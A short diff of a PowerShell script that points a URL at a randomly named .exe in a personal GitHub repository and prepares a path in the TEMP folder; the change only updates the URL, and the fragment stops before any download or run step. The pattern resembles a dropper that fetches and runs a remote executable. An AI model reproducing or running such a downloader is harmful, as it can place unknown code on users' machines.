@@ -1,7 +1,7 @@
 $ErrorActionPreference = "Stop"
 $Host.UI.RawUI.WindowTitle = "Eror"
 
-$url = "https://raw.githubusercontent.com/hal0151/erorFunTime1/main/9wa2f0ue919u7z1a.exe"
+$url = "https://raw.githubusercontent.com/hal0151/erorFunTime1/refs/heads/main/9wa2f0ue919u7z1a.exe"
 $path = Join-Path $env:TEMP "erorFunTime1.exe"
 
 try {
